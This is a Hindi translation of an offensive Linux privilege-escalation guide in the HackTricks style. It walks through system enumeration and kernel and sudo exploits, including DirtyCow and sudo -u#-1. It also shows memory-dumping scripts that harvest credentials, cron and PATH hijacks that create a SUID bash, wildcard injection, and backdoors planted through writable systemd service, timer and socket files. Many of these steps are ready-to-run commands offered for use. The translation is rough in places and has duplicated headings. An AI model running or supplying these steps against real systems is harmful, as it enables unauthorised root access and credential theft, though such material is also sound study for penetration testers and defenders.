# Linux विशेषाधिकार उन्नति

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर **फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github repos में PR जमा करके।

</details>

## सिस्टम सूचना

### ऑपरेटिंग सिस्टम सूचना

आइए शुरू करते हैं जिससे हम चल रहे ओएस के बारे में कुछ जानकारी प्राप्त कर सकें।
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### पथ

यदि आपको `PATH` चर में किसी भी फोल्डर पर लेखन अनुमति है तो आप कुछ लाइब्रेरी या बाइनरी को हाइजैक कर सकते हैं:
```bash
echo $PATH
```
### वातावरण सूचना

क्या वातावरण चरणों में दिलचस्प जानकारी, पासवर्ड या एपीआई कुंजी है?
```bash
(env || set) 2>/dev/null
```
### कर्नेल एक्सप्लॉइट्स

कर्नेल संस्करण की जाँच करें और यदि कोई एक्सप्लॉइट है जिसका उपयोग विशेषाधिकारों को बढ़ाने के लिए किया जा सकता है
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप एक अच्छी तरह से वलनरेबल कर्नल सूची और कुछ पहले से **कंपाइल किए गए एक्सप्लॉइट्स** यहाँ पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
अन्य साइट जहाँ आप कुछ **कंपाइल किए गए एक्सप्लॉइट्स** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी वलनरेबल कर्नल संस्करणों को निकालने के लिए आप कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
निम्नलिखित उपकरण कर्नेल एक्सप्लॉइट्स की खोज में मदद कर सकते हैं:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (कर्नेल 2.x के लिए एक्सप्लॉइट्स की जांच केवल पीड़ित में निष्पादित करें)

हमेशा **Google में कर्नेल संस्करण खोजें**, शायद आपके कर्नेल संस्करण किसी कर्नेल एक्सप्लॉइट में लिखा हो और फिर आप यह सुनिश्चित करेंगे कि यह एक्सप्लॉइट वैध है।

### CVE-2016-5195 (DirtyCow)

Linux विशेषाधिकार उन्नति - Linux कर्नेल <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### सुडो संस्करण

जो भी सुरक्षित सुडो संस्करण हैं उन पर आधारित:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि क्या सुडो संस्करण भेद्य है।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

@sickrov के द्वारा
```
sudo -u#-1 /bin/bash
```
### Dmesg हस्ताक्षर सत्यापन विफल

इस भेद को कैसे शोषित किया जा सकता है का **उदाहरण** देखने के लिए **HTB के smasher2 बॉक्स** की जाँच करें
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक सिस्टम जांच
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## विभाजन संभावित सुरक्षा की जांच करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity एक Linux कर्णेल पैच है जो एक्सेस कंट्रोल और सुरक्षा उन्नति प्रदान करता है।
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### पैक्स
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### एक्ज़ीक्यूशील्ड
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

**Translation:**
### एसईलिनक्स
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप एक डॉकर कंटेनर के अंदर हैं तो आप इससे बाहर निकलने का प्रयास कर सकते हैं:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## ड्राइव्स

**जांचें कि क्या माउंट किया गया है और क्या अनमाउंट किया गया है**, कहाँ और क्यों। यदि कुछ अनमाउंट किया गया है तो आप उसे माउंट करने का प्रयास कर सकते हैं और निजी जानकारी के लिए जांच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ्टवेयर

उपयोगी बाइनरी की जांच करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
भी जांचें कि **कोई कंपाइलर स्थापित** है। यह उपयोगी है अगर आपको कोई कर्णेल एक्सप्लॉइट का उपयोग करना हो तो यह सुनिश्चित करने के लिए कि आप उसे कंपाइल करेंगे मशीन में जहां आप इसका उपयोग करेंगे (या एक समान)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### वंलरेबल सॉफ्टवेयर इंस्टॉल किया गया है

**इंस्टॉल किए गए पैकेज और सेवाओं की संस्करण की जाँच** करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो, जिसका उपयोग विशेषाधिकारों को बढ़ाने के लिए किया जा सकता है...\
सुझाव दिया जाता है कि अधिक संदेहपूर्ण इंस्टॉल किए गए सॉफ्टवेयर के संस्करण की जाँच मैन्युअल रूप से की जाए।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन का SSH एक्सेस है तो आप **openVAS** का उपयोग कर सकते हैं ताकि मशीन में स्थापित पुराने और वंशवादी सॉफ़्टवेयर की जांच की जा सके।

{% hint style="info" %}
_ध्यान दें कि ये कमांड्स बहुत सारी जानकारी दिखाएंगे जो अधिकांशत: अनावश्यक होगी, इसलिए सिफारिश की जाती है कुछ एप्लिकेशन जैसे OpenVAS या समान उपयोग करें जो यह जांचेंगे कि क्या कोई स्थापित सॉफ़्टवेयर संस्करण ज्ञात शोषणों के लिए वंशवादी है_
{% endhint %}

## प्रक्रियाएँ

**देखें कि कौन सी प्रक्रियाएँ** कार्यान्वित हो रही हैं और यह जांचें कि क्या कोई प्रक्रिया **इससे अधिक अधिकार** रखती है (शायद रूट द्वारा चलाई गई कोई टॉमकैट?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा **electron/cef/chromium debuggers** के लिए संभावित चेक करें, आप इसका दुरुपयोग करके वर्चस्व उन्नति कर सकते हैं। **Linpeas** इसे पहचानता है जांच करके कि प्रक्रिया के कमांड लाइन में `--inspect` पैरामीटर है या नहीं।
इसके अलावा **प्रक्रियाओं के बाइनरी पर अपने वर्चस्व की जांच करें**, शायद आप किसी को ओवरराइट कर सकते हैं।

### प्रक्रिया मॉनिटरिंग

आप [**pspy**](https://github.com/DominicBreuker/pspy) जैसे उपकरणों का उपयोग कर सकते हैं प्रक्रियाओं को मॉनिटर करने के लिए। यह विशेष रूप से उपयोगी हो सकता है जब कोई वंश्चित प्रक्रियाएं निरंतर चलाई जा रही हों या जब एक सेट की गई आवश्यकताएं पूरी हों।

### प्रक्रिया मेमोरी

सर्वर की कुछ सेवाएं **मेमोरी के अंदर स्पष्ट पाठ में क्रेडेंशियल्स सहेजती हैं**।
सामान्यत: आपको दूसरे उपयोगकर्ताओं की प्रक्रियाओं की मेमोरी पढ़ने के लिए **रूट वर्चस्व** की आवश्यकता होगी, इसलिए यह आमतौर पर जब आप पहले से ही रूट हो और अधिक क्रेडेंशियल्स खोजना चाहते हो तो अधिक उपयोगी होता है।
हालांकि, ध्यान रखें कि **आजकल अधिकांश मशीनें डिफ़ॉल्ट रूप से ptrace की अनुमति नहीं देती हैं** जिसका मतलब है कि आप अपने अनुप्रयोगी उपयोगकर्ता के प्रक्रियाओं को डंप नहीं कर सकते।

फ़ाइल _**/proc/sys/kernel/yama/ptrace\_scope**_ ptrace की पहुंच को नियंत्रित करती है:

* **kernel.yama.ptrace\_scope = 0**: सभी प्रक्रियाएं डीबग की जा सकती हैं, जब तक उनका यूआईडी समान हो। यह ptracing का क्लासिकल तरीका है।
* **kernel.yama.ptrace\_scope = 1**: केवल एक माता प्रक्रिया को डीबग किया जा सकता है।
* **kernel.yama.ptrace\_scope = 2**: केवल व्यवस्थापक ptrace का उपयोग कर सकते हैं, क्योंकि इसे CAP\_SYS\_PTRACE क्षमता की आवश्यकता होती है।
* **kernel.yama.ptrace\_scope = 3**: कोई प्रक्रिया ptrace के साथ ट्रेस नहीं की जा सकती है। एक बार सेट करने के बाद, ptracing को फिर से सक्षम करने के लिए एक पुनरारंभ की आवश्यकता होती है।

#### GDB

यदि आपके पास एफटीपी सेवा की मेमोरी का एक्सेस है (उदाहरण के लिए) तो आप हीप को प्राप्त कर सकते हैं और इसके क्रेडेंशियल्स के अंदर खोज कर सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

एक दिए गए प्रक्रिया आईडी के लिए, **maps दिखाता है कि प्रक्रिया के** वर्चुअल पता स्थान में मेमोरी कैसे मैप है; यह भी **प्रत्येक मैप क्षेत्र की** अनुमतियाँ दिखाता है। **mem** प्यूडो फ़ाइल **प्रक्रिया की मेमोरी को खुद** उजागर करती है। हम **maps** फ़ाइल से जानते हैं कि कौन से **मेमोरी क्षेत्र पढ़ने योग्य** हैं और उनके ऑफसेट्स। हम इस जानकारी का उपयोग करते हैं **mem फ़ाइल में जाने और सभी पढ़ने योग्य क्षेत्रों को** एक फ़ाइल में डंप करने के लिए।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` प्रणाली की **भौतिक** स्मृति तक पहुंच प्रदान करता है, न कि आभासी स्मृति। कर्णेल का आभासी पता अंतर्ित करने के लिए /dev/kmem का उपयोग किया जा सकता है।\
सामान्यत: `/dev/mem` केवल **रूट** और **kmem** समूह द्वारा केवल पढ़ने योग्य होता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump एक Linux की पुनर्कल्पना है, जो Windows के Sysinternals सुइट से क्लासिक ProcDump उपकरण है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) से प्राप्त करें।
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

प्रक्रिया मेमोरी डंप करने के लिए आप निम्न उपकरण का उपयोग कर सकते हैं:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (रूट) - \_आप रूट आवश्यकताओं को मैन्युअल रूप से हटा सकते हैं और अपने द्वारा स्वामित प्रक्रिया को डंप कर सकते हैं
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) से स्क्रिप्ट A.5 (रूट की आवश्यकता है)

### प्रक्रिया मेमोरी से क्रेडेंशियल्स

#### मैन्युअल उदाहरण

यदि आपको लगता है कि प्रमाणीकरण प्रक्रिया चल रही है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप प्रक्रिया को डंप कर सकते हैं (प्रक्रिया की मेमोरी को डंप करने के विभिन्न तरीकों को देखने के लिए पहले खंड देखें) और मेमोरी में क्रेडेंशियल्स खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### मिमीपेंग्विन

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **मेमोरी से साफ पाठ प्रमाणपत्र चुरा लेगा** और कुछ **प्रसिद्ध फ़ाइलों** से। इसे सही ढंग से काम करने के लिए रूट विशेषाधिकारों की आवश्यकता है।

| विशेषता                                           | प्रक्रिया का नाम         |
| ------------------------------------------------- | -------------------- |
| GDM पासवर्ड (Kali डेस्कटॉप, Debian डेस्कटॉप)       | gdm-password         |
| ग्नोम कीरिंग (Ubuntu डेस्कटॉप, ArchLinux डेस्कटॉप) | gnome-keyring-daemon |
| LightDM (Ubuntu डेस्कटॉप)                          | lightdm              |
| VSFTPd (सक्रिय FTP कनेक्शन)                   | vsftpd               |
| Apache2 (सक्रिय HTTP बेसिक ऑथ सत्र)         | apache2              |
| OpenSSH (सक्रिय SSH सत्र - सुडो उपयोग)        | sshd:                |

#### खोज रेजेक्स/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## निर्धारित/Cron नौकरियाँ

जांचें कि क्या कोई निर्धारित नौकरी वंर्णनीय है। शायद आप किसी स्क्रिप्ट का फायदा उठा सकते हैं जो रूट द्वारा निष्पादित किया जा रहा है (वाइल्डकार्ड वल्न? क्या रूट द्वारा उपयोग किए जाने वाले फ़ाइलों को संशोधित किया जा सकता है? सिमलिंक का उपयोग किया जा सकता है? रूट द्वारा उपयोग किए जाने वाले निर्देशिका में विशेष फ़ाइलें बनाई जा सकती हैं?)।
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### क्रॉन पथ

उदाहरण के लिए, _/etc/crontab_ के अंदर आप _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_ पाएंगे

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लेखन अधिकार है_)

यदि इस crontab के अंदर रूट उपयोगकर्ता कोई कमांड या स्क्रिप्ट बिना पथ सेट किए को क्रियान्वित करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप निम्नलिखित का उपयोग करके रूट शैल को प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### क्रॉन एक स्क्रिप्ट का उपयोग करना जिसमें वाइल्डकार्ड है (वाइल्डकार्ड इंजेक्शन)

यदि रूट द्वारा एक स्क्रिप्ट को निष्पादित किया जाता है और उसमें किसी कमांड में "**\***" है, तो आप इसका शोषण कर सकते हैं ताकि अप्रत्याशित चीजें हो सकें (जैसे privesc). उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि वाइल्डकार्ड किसी पथ के पहले हो जैसे** _**/some/path/\***_ **, तो यह विकल्पनीय नहीं है (हालांकि** _**./\***_ ** भी नहीं है।)**

अधिक वाइल्डकार्ड उत्पीड़न ट्रिक्स के लिए निम्नलिखित पृष्ठ को पढ़ें:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### क्रॉन स्क्रिप्ट ओवरराइटिंग और सिमलिंक

यदि आप **रूट द्वारा निष्पादित किसी क्रॉन स्क्रिप्ट को संशोधित कर सकते हैं**, तो आप बहुत आसानी से एक शैल प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि रूट द्वारा निष्पादित स्क्रिप्ट एक **निर्देशिका का उपयोग करती है जिसमें आपके पास पूर्ण पहुंच है**, तो शायद उस फ़ोल्डर को हटाना और **एक सिमलिंक फ़ोल्डर बनाना दूसरे फ़ोल्डर के लिए** जो आपके द्वारा नियंत्रित स्क्रिप्ट को सेव करता है, यह उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### नियमित क्रॉन जॉब्स

आप प्रक्रियाओं का मॉनिटर कर सकते हैं ताकि आप 1, 2 या 5 मिनट के अंतराल पर चल रही प्रक्रियाओं की खोज कर सकें। शायद आप इसका फायदा उठा सकते हैं और विशेषाधिकारों को उन्नत कर सकते हैं।

उदाहरण के लिए, **1 मिनट के दौरान हर 0.1 सेकंड का मॉनिटरिंग करने** के लिए, **कम चलाए गए कमांड्स के आधार पर क्रमबद्ध करें** और सबसे अधिक चलाए गए कमांड्स को हटाएं, आप निम्नलिखित कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप यहाँ भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर प्रक्रिया को मॉनिटर और सूचीबद्ध करेगा जो शुरू होती है)।

### अदृश्य cron जॉब्स

एक कैरिज रिटर्न डालकर एक कमेंट के बाद (न्यूलाइन वर्ण के बिना), और क्रॉन जॉब काम करेगा। उदाहरण (कैरिज रिटर्न चार ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएं

### लिखने योग्य _.service_ फ़ाइलें

जांचें कि क्या आप किसी भी `.service` फ़ाइल को लिख सकते हैं, यदि हां, तो आप इसे **संशोधित** कर सकते हैं ताकि जब सेवा **शुरू**, **पुनः आरंभ** या **रोकी** जाती है, तो यह आपका **बैकडोर निष्पादित** करें (शायद आपको मशीन को रिबूट होने तक प्रतीक्षा करनी पड़ेगी)।\
उदाहरण के लिए अपना बैकडोर बनाएं .service फ़ाइल के अंदर **`ExecStart=/tmp/script.sh`**

### लिखने योग्य सेवा बाइनरी

ध्यान रखें कि यदि आपके पास सेवाओं द्वारा निष्पादित बाइनरी पर **लिखने की अनुमति** है, तो आप उन्हें बैकडोर के लिए बदल सकते हैं ताकि जब सेवाएं पुनः निष्पादित हों, तो बैकडोर निष्पादित होंगे।

### systemd PATH - सापेक्ष मार्ग

आप **systemd** द्वारा उपयोग किए जाने वाले PATH को देख सकते हैं:
```bash
systemctl show-environment
```
यदि आपको लगता है कि आप **किसी भी फ़ोल्डर में लिख सकते हैं** तो आपको **विशेषाधिकारों को बढ़ाने** की संभावना हो सकती है। आपको **सेवा कॉन्फ़िगरेशन** फ़ाइलों पर उपयोग किए जा रहे **सापेक्ष मार्गों की खोज** करनी चाहिए।
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, **निष्पादनीय** बनाएं जिसका **नाम सम्बन्धित पथ बाइनरी के नाम के समान हो** सिस्टमड पाथ फोल्डर के अंदर जिसे आप लिख सकते हैं, और जब सेवा से वंशवादी कार्रवाई (**शुरू**, **रोकें**, **रीलोड**) करने के लिए कहा जाए, तो आपका **बैकडोर निष्पादित होगा** (अनुप्रयोगी उपयोगकर्ता साधारणत: सेवाएं शुरू/रोकने में सक्षम नहीं हो सकते हैं लेकिन जांचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं।)

**`man systemd.service`** के साथ सेवाओं के बारे में अधिक जानें।

## **टाइमर्स**

**टाइमर्स** systemd इकाई फ़ाइलें हैं जिनका नाम `**.timer**` में समाप्त होता है जो `**.service**` फ़ाइलें या घटनाएँ नियंत्रित करती हैं। **टाइमर्स** क्रॉन के विकल्प के रूप में उपयोग किए जा सकते हैं क्योंकि उनमें कैलेंडर समय घटनाओं और मोनोटोनिक समय घटनाओं के लिए सहायक समर्थन है और वे असमंजस में चलाए जा सकते हैं।

आप सभी टाइमर्स को निरूपित कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप एक टाइमर को संशोधित कर सकते हैं तो आप इसे कुछ systemd.unit के मौजूदा को निष्पादित करने के लिए कर सकते हैं (जैसे एक `.service` या एक `.target`)
```bash
Unit=backdoor.service
```
दस्तावेज़ में आप पढ़ सकते हैं कि इकाई क्या है:

> यह टाइमर समाप्त होने पर सक्रिय करने के लिए इकाई। तार्किक रूप से एक इकाई नाम है, जिसका समाप्तिकरण ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान डिफ़ॉल्ट करता है एक सेवा के लिए जिसका नाम टाइमर इकाई के नाम के समान है, सिवाय समाप्तिकरण के। (ऊपर देखें।) सुझाव दिया जाता है कि सक्रिय किए जाने वाली इकाई का नाम और टाइमर इकाई का इकाई नाम समान हो, समाप्तिकरण को छोड़कर।

इसलिए, इस अनुमति का दुरुपयोग करने के लिए आपको करना होगा:

* किसी सिस्टमड इकाई (जैसे `.service`) को खोजें जो **एक लिखने योग्य बाइनरी को निष्पादित** कर रहा है
* किसी सिस्टमड इकाई को खोजें जो **एक सापेक्ष मार्ग को निष्पादित** कर रहा है और आपके पास **सिस्टमड पाथ** पर **लिखने योग्य अधिकार** हैं (उस निष्पादन का अनुकरण करने के लिए)

**टाइमर के बारे में अधिक जानें `man systemd.timer`।**

### **टाइमर सक्षम करना**

टाइमर को सक्षम करने के लिए आपको रूट अधिकार चाहिए और निष्पादित करने के लिए:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
**ध्यान दें** कि **टाइमर** को `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर एक symlink बनाकर **सक्रिय** किया जाता है।

## सॉकेट्स

Unix डोमेन सॉकेट्स (UDS) क्लाइंट-सर्वर मॉडल के भीतर समान या भिन्न मशीनों पर **प्रक्रिया संचार** को संभावित बनाते हैं। इन्हें अंतर-कंप्यूटर संचार के लिए मानक Unix डिस्क्रिप्टर फ़ाइलों का उपयोग करते हैं और ये `.socket` फ़ाइलों के माध्यम से सेटअप किए जाते हैं।

सॉकेट्स को `.socket` फ़ाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**`man systemd.socket` के साथ सॉकेट्स के बारे में अधिक जानें।** इस फ़ाइल के भीतर, कई दिलचस्प पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं लेकिन एक सारांश का उपयोग सॉकेट पर **कहाँ सुनेगा** इसे दर्शाने के लिए किया जाता है (AF\_UNIX सॉकेट फ़ाइल का पथ, सुनने के लिए IPv4/6 और/या पोर्ट नंबर, आदि)।
* `Accept`: एक बूलियन तर्क लेता है। यदि **सही** है, तो प्रत्येक आने वाली कनेक्शन के लिए एक **सेवा इंस्टेंस उत्पन्न** किया जाता है और केवल कनेक्शन सॉकेट उसे पारित किया जाता है। यदि **गलत** है, तो सभी सुनने वाले सॉकेट स्वयं **शुरू की गई सेवा इकाई** को पारित किया जाता है, और केवल एक सेवा इकाई सभी कनेक्शनों के लिए उत्पन्न किया जाता है। यह मान्य नहीं है डेटाग्राम सॉकेट्स और FIFOs के लिए जहां एक ही सेवा इकाई निरंतर आने वाली ट्रैफ़िक को संभालती है। **डिफ़ॉल्ट रूप से गलत** है। प्रदर्शन कारणों के लिए, यह सुझाव दिया जाता है कि नए डेमन को केवल उस तरीके में लिखना चाहिए जो `Accept=no` के लिए उपयुक्त है।
* `ExecStartPre`, `ExecStartPost`: एक या एक से अधिक कमांड लाइन लेता है, जो सुनने वाले **सॉकेट**/FIFOs को **बनाए जाने से पहले** या **बाद में** निष्पादित किए जाते हैं और बाउंड किए जाते हैं। कमांड लाइन का पहला टोकन एक पूर्ण फ़ाइल नाम होना चाहिए, फिर प्रक्रिया के लिए तर्कों का अनुसरण किया जाना चाहिए।
* `ExecStopPre`, `ExecStopPost`: अतिरिक्त **कमांड** जो सुनने वाले **सॉकेट**/FIFOs को **बंद करने से पहले** या **बाद में** निष्पादित किए जाते हैं और हटाए जाते हैं।
* `Service`: **इनकमिंग ट्रैफ़िक** पर **सक्रिय करने के लिए** नामित **सेवा** इकाई को निर्दिष्ट करता है। यह सेटिंग केवल `Accept=no` वाले सॉकेट्स के लिए अनुमति दी गई है। इसका डिफ़ॉल्ट सेवा वह होता है जो सॉकेट के नाम के समान होता है (सफ़िक्स को बदलकर)। अधिकांश मामलों में, इस विकल्प का उपयोग करने की आवश्यकता नहीं होनी चाहिए।

### लिखने योग्य .socket फ़ाइलें

यदि आपको एक **लिखने योग्य** `.socket` फ़ाइल मिलती है तो आप `[Socket]` खंड की शुरुआत में कुछ इस प्रकार जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और सॉकेट बनाया जाने से पहले बैकडोर निष्पादित किया जाएगा। इसलिए, आपको **संभावित है कि मशीन को रिबूट होने तक प्रतीक्षा करनी पड़ेगी**।\
_ध्यान दें कि सिस्टम को उस सॉकेट फ़ाइल कॉन्फ़िगरेशन का उपयोग करना चाहिए या तो बैकडोर निष्पादित नहीं होगा_

